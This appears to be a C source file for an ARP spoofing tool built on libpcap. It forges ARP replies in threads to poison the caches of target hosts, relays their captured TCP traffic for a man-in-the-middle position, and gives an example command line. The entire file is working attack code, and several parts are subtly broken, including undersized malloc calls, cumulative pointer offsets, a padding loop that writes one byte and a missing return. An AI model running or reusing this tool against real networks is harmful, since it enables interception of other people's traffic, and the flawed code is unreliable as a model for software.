//backup

#include <stdlib.h>
#include <stdio.h>
#include <pcap/pcap.h>
#include <pcap.h>
#include <string.h>
#include <net/ethernet.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <sys/socket.h>

#include <pthread.h>

#pragma pack(1)
//push 1byte pop?

#include "header.h"


/* get my Mac Address */
void getMacAddress(char *interface, unsigned char * my_mac){
  
  int sock_mac = socket(PF_INET, SOCK_DGRAM, 0);
  struct ifreq req_mac;
        strncpy(req_mac.ifr_name, interface, IF_NAMESIZE - 1);
  ioctl(sock_mac, SIOCGIFHWADDR, &req_mac); 
  close(sock_mac);
  memmove((void*)&my_mac[0],(void*)&req_mac.ifr_hwaddr.sa_data[0],6);
}

/* Check IP Address */
int check_ARP_Reply(pcap_t *handle, struct arp_packet * arp_sender,int flag /*struct ARP_Spoof *spoof_info*/){

  struct ether_h *et_h;
    struct arp_hdr *arp_h;
  while (true) {
    
    struct pcap_pkthdr* header;  
    const u_char* packet;
    int res = pcap_next_ex(handle, &header, &packet);
        
    if (res == 0) continue;
    if (res == -1 || res == -2) break;

    et_h = (struct ether_h *)packet;
    //ETHERTYPE_ARP 0x806
    if (htons(et_h->ether_type) == ETHERTYPE_ARP){
      arp_h = (struct arp_hdr *)(packet + sizeof(struct ether_h));
      

       /* check Arp Reqest src IP */
      if (memcmp((void*)&arp_sender->spoof_info.ip_dst, (void*)&arp_h->ip_src, 4) ==0){
        memcpy(arp_sender->spoof_info.ether_dst_mac, et_h->ether_src_mac, 6);

        if (flag == 1){
          memcpy(arp_sender->dst_in.dst_mac, et_h->ether_src_mac, 6);
          arp_sender->dst_in.ip_dst = arp_h->ip_src;        
        }
        return 1;
      }
    }
  }
}

void setSendPacket(struct arp_packet * arp_sender){
  //arp_sender
  /* make the BroadCast Packet into EtherNet Header 14byte */

  memcpy(arp_sender->et_h.ether_dst_mac, arp_sender->spoof_info.ether_dst_mac , 6);
  memcpy(arp_sender->et_h.ether_src_mac, arp_sender->spoof_info.ether_src_mac, 6);
  arp_sender->et_h.ether_type = htons (0x806);

  /* make the BroadCast Packet into ARP Header 28byte */
  arp_sender->arp_h.hardware_type = htons (0x1); 
  arp_sender->arp_h.proto_type = htons (0x800);
  arp_sender->arp_h.hard_add_len = (0x6);
  arp_sender->arp_h.proto_add_len = (0x4);  
  arp_sender->arp_h.opcode = arp_sender->spoof_info.opcode;        
  memcpy(arp_sender->arp_h.send_mac, arp_sender->spoof_info.ether_src_mac, 6 ); 
  arp_sender->arp_h.ip_src = arp_sender->spoof_info.ip_src;
  memcpy(arp_sender->arp_h.dst_mac, arp_sender->spoof_info.ether_dst_mac, 6 );
  arp_sender->arp_h.ip_dst = arp_sender->spoof_info.ip_dst;
}

void sendRequestPacket(struct arp_packet * arp_sender, pcap_t* handle)
{
  /* setting the ARP Packet */
  u_char sendpacket[60];
  int i;
  char errbuf[PCAP_ERRBUF_SIZE];
  //pcap_t* handle = pcap_open_live(arp_sender->ip_in.mac_info, BUFSIZ, 1, 1000, errbuf);
  memcpy(sendpacket, arp_sender, 42);
  for (i=42 ; i<60 ; i++)
    sendpacket[42] = 0x00;
  pcap_sendpacket(handle, sendpacket, 42 /* size */);

}


int setARP_RequestPacket(struct arp_packet * arp_sender, struct ip_info *ip){
  
  struct ip_info *sender_ip;
  char errbuf[PCAP_ERRBUF_SIZE];
  u_char packet[60];
  char *dev;
  
  sender_ip = (struct ip_info*)ip;
  arp_sender->ip_in.mac_info = sender_ip->mac_info;
  /* Open the output device */
  pcap_t* handle = pcap_open_live(arp_sender->ip_in.mac_info, BUFSIZ, 1, 1000, errbuf);
    
  /* get the my Device MAC Address */
  unsigned char myMac[6];
  getMacAddress(arp_sender->ip_in.mac_info, myMac); //dev ens33 wlan0

  /* set arp request packet */
  char broadCast[6] = {0xff,0xff,0xff,0xff,0xff,0xff};
  memcpy(arp_sender->spoof_info.ether_dst_mac, broadCast , 6 );
  memcpy(arp_sender->spoof_info.ether_src_mac, myMac , 6 );
  arp_sender->spoof_info.opcode = htons(0x01);
  inet_aton(sender_ip->ip_dst, &arp_sender->spoof_info.ip_dst);
  inet_aton(sender_ip->ip_src, &arp_sender->spoof_info.ip_src);

  
  setSendPacket(arp_sender);
  sendRequestPacket(arp_sender,handle);

  /* get reciever ip , mac info */
  if (check_ARP_Reply(handle, arp_sender, 1))
  {
    inet_aton(sender_ip->ip_dst, &arp_sender->spoof_info.ip_src);
    inet_aton(sender_ip->ip_src, &arp_sender->spoof_info.ip_dst);
    memcpy(arp_sender->spoof_info.ether_dst_mac, broadCast , 6 );
    setSendPacket(arp_sender); 
    // printEthPacket(arp_sender);  
    sendRequestPacket(arp_sender,handle);

    /* get sender ip , mac info */
    if (check_ARP_Reply(handle, arp_sender, 0)){
      arp_sender->spoof_info.opcode = htons(0x02);   
      setSendPacket(arp_sender);
      //printEthPacket(arp_sender); 
    }
  }
  
}

// ./arp ens33 192.168.233.130 192.168.233.2 192.168.233.2 192.168.233.130



void* relayPacket(void * arp_sender){
	
	struct ether_h *et_h;
	struct ip_hdr * ip_h;
    struct arp_hdr *arp_h;
	char errbuf[PCAP_ERRBUF_SIZE];
	char *dev;
	struct arp_packet * arp_info;
	arp_info = (struct arp_packet*) arp_sender;
	
	
	

	dev = arp_info->ip_in.mac_info;
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
  	

	while (true) {
		struct pcap_pkthdr* header;
		struct ether_h * et_h;
    	const u_char* packet;
    	const u_char* tmp;
    	int res = pcap_next_ex(handle, &header, &packet);
    		
    		if (res == 0) continue;
    		if (res == -1 || res == -2) break;

    	tmp = packet;
    	et_h = (struct ether_h *)tmp;

    	if(ntohs(et_h->ether_type) == ETHERTYPE_IP){
    		tmp += sizeof(struct ether_h);
        	ip_h = (struct ip_hdr *)tmp;
        	if (ip_h->ip_p == IPPROTO_TCP){
        		
				if (memcmp((void *)(packet+6), (void *)arp_info->et_h.ether_dst_mac,6) ==0
					&& memcmp((void *)packet, (void *)arp_info->et_h.ether_src_mac,6) ==0
					&& memcmp((void *)&ip_h->ip_dst, (void *)&arp_info->dst_in.ip_dst,4)==0 ){

						memcpy((void *)packet , (void *)arp_info->dst_in.dst_mac , 6);
						pcap_sendpacket(handle, packet, header->caplen /* size */);
						printf("TCP");
						printf("\nsize : %d\n",header->caplen);
	
				}
			}
		}		
	}
		//TODO Unicast 
		//TODO Broad_Cast

}


//Set ARP Packet
void* send_ArpPacket(void * packet){

	struct arp_packet *arp_sender;
	arp_sender = (struct arp_packet*) packet;
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(arp_sender->ip_in.mac_info, BUFSIZ, 1, 1000, errbuf);

	while(1){
		sleep(5);
		sendRequestPacket(arp_sender,handle);
	}
}


int main(int argc, char *argv[])
{
	int thread_num = argc/2 - 1 ;
	char errbuf[PCAP_ERRBUF_SIZE];
	struct arp_packet * arp_sender, *arp_recevier;
	struct ip_info ip_in;


	struct arp_packet * arp_spo_packet = (struct arp_packet *)malloc(thread_num);
	struct arp_packet * tmp_arp_packet;	
	
	struct relay_info *relay_in = (struct relay_info *)malloc(thread_num);
	struct relay_info *tmp_relay_in;

	struct dst_info * static_dst_infos = (struct dst_info* )malloc(thread_num);
	struct dst_info * tmp_dst_in;
	int i;
	
	pcap_t* handle = pcap_open_live(argv[1], BUFSIZ, 1, 1000, errbuf);
	
	tmp_arp_packet = arp_spo_packet;
	tmp_dst_in = static_dst_infos;

	for (i = 0 ; i < thread_num ; i++){
		//printf("hello\n");
		ip_in.ip_src = argv[2*i+2];
		ip_in.ip_dst = argv[2*i+3];
		ip_in.mac_info = argv[1];
		//tmp_relay_in +=i;
		tmp_arp_packet +=i;
		tmp_dst_in +=i;
		setARP_RequestPacket(tmp_arp_packet, &ip_in);
	
	}

	//arp spoofing
	pthread_t * t_sender = (pthread_t *)malloc(thread_num);
	pthread_t *tmp_sender;
	

	//arp relay
	pthread_t *t_relay = (pthread_t *)malloc(thread_num);
	pthread_t *tmp_relay;
	
	tmp_arp_packet = arp_spo_packet;
	tmp_sender = t_sender;
	tmp_relay = t_relay;


	for (i = 0 ; i < thread_num ; i++){
		tmp_arp_packet +=i;
		tmp_sender +=i;
		tmp_relay +=i;
		pthread_create(tmp_sender, NULL, send_ArpPacket, (void*)tmp_arp_packet);
		pthread_create(tmp_relay, NULL, relayPacket, (void*)tmp_arp_packet);		
	}


	tmp_sender = t_sender;
	tmp_relay = t_relay;
	for (i = 0 ; i < thread_num ; i++){
	 	//tmp_arp_packet +=i;
	 	tmp_sender +=i;
	 	tmp_relay +=i;
	 	pthread_join(*tmp_sender, NULL);
	 	pthread_join(*tmp_relay, NULL);
	}
	
	//memory free
	free(t_sender);
	free(t_relay);
}
